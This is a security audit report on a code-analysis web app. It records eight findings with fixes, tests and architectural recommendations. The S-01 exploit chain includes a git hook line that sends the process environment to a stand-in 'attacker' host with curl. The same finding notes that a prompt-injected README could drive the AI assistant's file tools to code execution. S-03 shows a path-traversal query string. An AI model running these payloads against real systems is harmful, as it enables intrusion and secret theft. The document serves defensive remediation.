# Security audit — 2026-08-08

Full-stack production security audit and remediation of CodeGraph at `057da26`.
Scope: `apps/web` (UI, ~29 API routes, analysis engine), `packages/*`, `apps/worker`,
`apps/cli`, Docker/Render/CI configuration, dependency surface.

References: OWASP Top 10 (2021), OWASP API Top 10 (2023), OWASP ASVS 4.0, CWE, NIST SP 800-53.

Method: five parallel read-only passes (authn/authz, injection, frontend, infrastructure,
business logic/DoS), each required to cite `path:line`; every reported finding then verified
by the lead against current code, and — for the two criticals — reproduced.
Findings already closed by earlier passes (`docs/AUDIT_2026-07-12.md`, tracker Phase 0/7,
commits `180168f`/`79a943a`/`057da26`) were excluded rather than re-counted.

Baseline before the work: `npm run typecheck` 0, 1274/1274 tests, depcruise clean.
After: typecheck 0, **1286/1286 tests** (12 new security regression cases, 3 new files),
depcruise clean, `next build` clean.

---

## Verified findings and remediation

### S-01 — Remote code execution: the editor filesystem API can write into `.git`

| | |
|---|---|
| Severity | **Critical** |
| CWE | CWE-94 (code injection) via CWE-668 (exposure of resource to wrong sphere) |
| Location | `packages/fsx/src/workspace.ts:53` (`resolveSafe`), reachable from `apps/web/src/app/api/repos/[id]/fs/route.ts:76`, `apps/web/src/lib/agents/workspaceToolImpls.ts:45` |
| Status | **Fixed** |

**Evidence.** `resolveSafe` refused only paths that escape the workspace root. `.git` is inside
it. `listDir` hid the directory from the UI (`workspace.ts:130 — "never surface .git as an
editable dir"`), which is presentation, not authorization: every write helper resolved
`.git/...` happily. `writeFileSync` on an existing file preserves its mode, and `git clone`
installs the template hooks at mode 0755.

**Exploitation path** (anonymous, against any repo in the shared public bucket):

```
POST /api/repos/<id>/fs {"op":"rename","path":".git/hooks/pre-commit.sample",
                         "to":".git/hooks/pre-commit"}      # 0755 preserved
POST /api/repos/<id>/fs {"op":"write","path":".git/hooks/pre-commit",
                         "content":"#!/bin/sh\ncurl attacker/$(cat /proc/self/environ|base64)\n"}
POST /api/repos/<id>/git {"op":"commit","message":"x"}      # git runs the hook
```

Reproduced locally end to end: after the rename+write the hook kept mode `755` and
`git commit` executed it (`id` output captured). The container runs as **root** by
deliberate design (Render constraint, `CLAUDE.md` §6), so this is root RCE on the host,
plus read of `ANTHROPIC_API_KEY`/`CG_SESSION_SECRET` from the process environment.
Two further variants share the root cause: `.git/config` (`core.fsmonitor` is a command git
executes) and reading `.git/config`/`.git/packed-refs` for remote URLs.
The same primitive is reachable through the AI assistant's `write_file`/`rename_entry` tools,
which makes repository content (a prompt-injected `README.md`) an RCE trigger.

**Root cause.** Containment was defined as "inside the root" only; `.git` is inside the root
but is executable metadata, not user content.

**Fix.** `assertNotGitDir` in `packages/fsx/src/workspace.ts` — every `resolveSafe` caller
(read, write, create, rename, duplicate, trash, assistant tools, `openWorkspace` handle) now
refuses any path with a `.git` segment, checked post-normalisation and case-insensitively.
`.gitignore`, `.github/**` and files merely containing "git" are unaffected.
Tests: `packages/fsx/tests/containment.test.ts` (5 new cases, including the hook-rename chain
and the no-regression dotfile cases).

---

### S-02 — Arbitrary host file read: the indexer walk follows symlinks out of the clone

| | |
|---|---|
| Severity | **Critical** |
| CWE | CWE-59 (link following) → CWE-200 |
| Location | `packages/analysis/src/indexer.ts:147` |
| Status | **Fixed** |

**Evidence.** The walk used `statSync`, which reports the *target's* type:

```ts
st = statSync(full);
if (st.isDirectory()) { … stack.push(full); }
else if (st.isFile())  { … out.push(full); }
```

**Exploitation path.** Publish a repository containing `escape -> /` (or `notes.ts ->
/etc/passwd`); index it (anonymous indexing is a supported product path). The walk descends
through the link, parses host files, and writes their paths, symbols, findings and matched
lines into the repo's graph — readable by anyone who can open that repo. `/proc/self/environ`
reports size 0, so the `MAX_FILE_BYTES` cap does not exclude it.

**Why existing guards miss it.** `resolveSafe` is symlink-aware but the indexer does not use
it; the two sandbox walks that *do* refuse symlinks (`apps/web/src/lib/agents/executor.ts:51`,
`packages/remediate-engine/src/apply.ts:124`) are different code paths. This walk was extracted
into `@codegraph/analysis` after those fixes and did not inherit them.

**Fix.** `lstatSync` + explicit symlink skip (counted as `skippedUnreadable`, whose contract
already covers broken links). Tests: `packages/analysis/tests/symlink-containment.test.ts`
(symlinked directory and symlinked file); verified to fail with the fix reverted.

---

### S-03 — Cross-tenant read + argv injection through the timeline commit hash

| | |
|---|---|
| Severity | **High** |
| CWE | CWE-22 (path traversal), CWE-88 (argument injection) |
| Location | `apps/web/src/lib/gitops/timelineStore.ts:19`, `apps/web/src/lib/gitops/snapshotLoader.ts:24`, route `apps/web/src/app/api/repos/[id]/timeline/route.ts` |
| Status | **Fixed** |

**Evidence.** `getSnapshotPath(repoId, hash)` was `path.join(dataDir(), "timeline", repoId,
`${hash}.json`)` with `hash` taken verbatim from the query string, and `loadSnapshot` passed the
same value into `git archive --format=tar <hash>`'s argv and into a `mkdtemp` template.

**Exploitation.** `GET /api/repos/<own-repo>/timeline?op=snapshot&hash=../<victim-repo-id>/<commit>`
returns the victim repository's cached architecture snapshot: the `:id` guard authorises the
repo the caller *names*, not the directory the hash then walks into. `hash=../../../…` reaches
any `.json` on the host. The argv position had no `--` separator and no `assertRefArg`
equivalent — the exact class fixed in `packages/vcs/src/git.ts` for `checkout`/`diff`, which the
gitops timeline path bypasses because it spawns git itself.

**Fix.** `isCommitHash` (`/^[0-9a-fA-F]{4,64}$/`) exported from `timelineStore.ts`; enforced in
`getSnapshotPath` (covers every caller), at the `git archive` argv boundary in `snapshotLoader`,
and at the route for `hash`/`base`/`head` so a bad value is a 400 rather than a 500.
Tests: `apps/web/tests/timeline-hash.test.ts` (3 cases incl. the cross-repo read).

---

### S-04 — SSRF: `git clone` follows the redirect the URL guard just vetted

| | |
|---|---|
| Severity | **Medium** |
| CWE | CWE-918 |
| Location | `packages/vcs/src/acquire.ts:40` |
| Status | **Fixed** |

**Evidence & proof.** `isPublicHttpUrl` checks the URL *string*; git's default
`http.followRedirects=initial` then follows a 302 from that vetted host. Reproduced against a
real git and a local redirector: with the default, `git clone http://vetted/repo.git` answered
`302 -> http://127.0.0.1:9/…` failed with *"Failed to connect to 127.0.0.1 port 9"* — it left
the vetted host. With `-c http.followRedirects=false` it fails with *"The requested URL returned
error: 302"* and never connects. Impact: reachability of internal HTTP endpoints (cloud metadata,
internal git servers whose repositories would then be cloned and indexed).

**Fix.** Both clone paths now prepend `-c http.followRedirects=false`. Known behavioural cost,
documented in the code: a renamed GitHub repo or an `http://` URL the host upgrades must be given
by its final URL. Test: `packages/vcs/tests/clone-redirect.test.ts`.

---

### S-05 — Raw exception text returned by the timeline route

| | |
|---|---|
| Severity | **Medium** |
| CWE | CWE-209 |
| Location | `apps/web/src/app/api/repos/[id]/timeline/route.ts:10` (was `return NextResponse.json({ error: msg })`) |
| Status | **Fixed** |

The route drives `git archive`/`git log` inside the workspace, so its failures carry git stderr
and the server's absolute workspace path (`/app/data/workspaces/<uuid>/…`) — the disclosure the
`fs`, `trash` and `git` routes already suppress (F023), and the readback channel that made the
2026-08-05 argv injection observable. Now logged server-side, generic message to the client.

---

### S-06 — Unthrottled outbound amplification on `POST /api/settings/assistant`

| | |
|---|---|
| Severity | **Low** |
| CWE | CWE-770 |
| Location | `apps/web/src/app/api/settings/assistant/route.ts:34` |
| Status | **Fixed** |

The handler verifies a pasted Anthropic key by calling Anthropic (8 s timeout) before saving.
No limiter, and on a deployment without GitHub sign-in the route is anonymous. Added the same
token bucket the other expensive routes use (20/min per IP).

---

### S-07 — Missing HSTS

| | |
|---|---|
| Severity | **Low** |
| CWE | CWE-319 |
| Location | `apps/web/next.config.ts:87` |
| Status | **Fixed** |

CSP, `X-Frame-Options`, `nosniff`, `Referrer-Policy` and `Permissions-Policy` were present;
`Strict-Transport-Security` was not. Added `max-age=63072000; includeSubDomains` (no `preload`:
that commitment belongs to the operator). Browsers ignore the header over plain http, so local
http deployments are unaffected.

---

### S-08 — CI workflow granted the repository-default `GITHUB_TOKEN`

| | |
|---|---|
| Severity | **Low** |
| CWE | CWE-276 |
| Location | `.github/workflows/ci.yml` |
| Status | **Fixed** |

`ci.yml` had no `permissions:` block, so the token followed repository settings (often write)
while the job installs and executes the whole dependency tree. Now `contents: read`.
(`publish-image.yml` already scoped its own to `packages: write`.)

---

## Checked and found already sound

Not re-reported; verified against current code during this pass.

- **Session**: AES-256-GCM encrypted httpOnly cookie, server-side expiry, `Secure` derived from
  the real transport, `SameSite=Lax`; token never echoed by `/api/auth/me` (`lib/session.ts`).
- **Tenant isolation**: `repoAccessDenied`/`requireWorkspace` on every repo-scoped route,
  structurally enforced by `tests/route-guards.test.ts`; 404 (not 403) for other tenants' repos.
- **Trash**: every lookup scoped `WHERE id = ? AND repo_id = ?` (`packages/persistence/src/trash.ts`).
- **SQL**: parameterised throughout `packages/persistence`; interpolation only of literals.
- **Argument injection** into `git checkout`/`diff`/`branch`: `assertRefArg` at the argv boundary.
- **Path traversal / symlink escape** in the workspace API: `resolveSafe`'s ancestor walk and
  dangling-symlink handling (26 containment tests).
- **Editor search walk**: dirent-based, so symlinks are neither `isDirectory()` nor `isFile()`.
- **Index cache**: size-capped, shape-validated `JSON.parse` (no prototype pollution).
- **Frontend**: no `dangerouslySetInnerHTML` with attacker data, no token in `localStorage`,
  OAuth `returnTo` gated by `isSafeReturnPath`, RFC 5987 `Content-Disposition`.
- **Credential handling**: `publishCredential` is the only source of a push token; clone/push
  failures pass through `redactCredentials`.
- **Supply chain**: no install/postinstall lifecycle scripts in any workspace, no git/http
  dependency specifiers, no secrets in `render.yaml` (all `sync: false`) or Docker build args.

---

## Architectural recommendations — documented, deliberately NOT implemented

Each requires a change to structure or product behaviour beyond the "minimal, non-breaking
diff" mandate of this pass.

### A-01 — Job execution is unbounded and in-process by default

*Problem.* `config.useWorker` defaults to `false` (`packages/config/src/definition.ts:150`), so
`POST /api/index` and `/api/repos/:id/reindex` run the full pipeline on the web process via
`void runJob()` (`apps/web/src/lib/store.ts:140`). The per-repo busy check serialises one repo,
not the host; per-IP rate limits do not bound total concurrency.
*Risk.* Memory and CPU exhaustion of a 512 MB / 0.5 vCPU instance from a modest number of
distinct repositories — a DoS reachable without authentication where anonymous indexing is on.
*Recommended architecture.* Make `CG_USE_WORKER=true` the deployed default (the image already
sets it) and give the queue a global concurrency ceiling plus admission control, so a burst
queues instead of oversubscribing. HLD ADR-001 already moves analysis out of process; this is
that decision's operational half.
*Expected impact.* Bounded RSS under load; queue latency replaces failure. Requires worker-mode
verification of cancellation, progress and the SSE path.

### A-02 — SSE streams have a per-connection cap but no aggregate one

*Problem.* `GET /api/jobs/:id/events` polls SQLite every 500 ms per connection for up to 15 min
(`events/route.ts:26,32`); nothing bounds the number of concurrent streams per client or host.
*Risk.* Cheap event-loop and connection saturation.
*Recommended architecture.* A connection registry with a per-IP and global ceiling, returning 503
past it, plus a shared tick that fans out to subscribers rather than one interval per connection.

### A-03 — CSP still allows `'unsafe-inline'` and `'unsafe-eval'`

Carried over deliberately (F020/F052): Monaco loads from `cdn.jsdelivr.net` and Next injects
inline hydration scripts. A nonce migration needs `report-to` telemetry and a staged rollout,
not a blind tightening. Until then an injected-HTML bug is directly exploitable; every current
sink is developer-authored, which is what makes the deferral acceptable rather than safe.

### A-04 — SSRF guard cannot survive DNS rebinding

`isPublicHttpUrl` validates the hostname; the connection is made later by git. Closing this
requires resolving DNS in-process and pinning the connection to the validated address, which
`git clone` gives no hook for — it needs a fetch-then-hand-to-git acquisition step, or an egress
allowlist at the platform.

### A-05 — Container runs as root

Documented and deliberate (Render does not grant `CAP_SETUID`; dropping privileges crash-loops).
It is nonetheless the multiplier on S-01. Recommended: an entrypoint that chowns the mounted disk
and drops to a non-root user where the platform permits, gated by a capability probe rather than
assumed.

### A-06 — The assistant auto-approves its own tool calls

`canUseTool` returns `allow` unconditionally (`agents/assistant.ts:277`) — sound only because the
tool surface is nine path-safe wrappers with no shell. With S-01 fixed the escalation path is
closed, but the property that keeps it safe is undocumented and untested. Recommended: a
tool-surface assertion test, and user confirmation for the mutating tools (`write_file`,
`rename_entry`, `delete_entry`, `git_commit`) when the session is not the repo owner's.

### A-07 — Anonymous repositories share one world-writable bucket

The product decision (tracker, 2026-07-12; consent dialog added in `79a943a`). It remains the
precondition of every "anonymous attacker" path in this document, S-01 and S-02 included.
Recommended when the product allows: per-visitor ownership keyed to a signed anonymous id, which
turns the shared bucket into per-session isolation without requiring sign-in.

### A-08 — Third-party actions are pinned by mutable tag

`actions/checkout@v4`, `actions/setup-node@v4`. SHA pinning + Dependabot is the standard closure;
left out here because it is a policy change to how the repo consumes actions, not a defect fix.

---

## Verification

| Gate | Before | After |
|---|---|---|
| `npm run typecheck` | 0 | 0 |
| `npx vitest run` | 1274/1274 | **1286/1286** |
| `npm run depcruise` | clean | clean (271 modules) |
| `npm run build` | clean | clean |

Behavioural proofs beyond the suite: the S-01 hook chain reproduced pre-fix and refused post-fix
(also at the route layer: 400 for `.git`, 200 for `src/app.ts`); S-02 tests fail with the fix
reverted; S-04 verified against a real redirecting HTTP server with and without the flag.
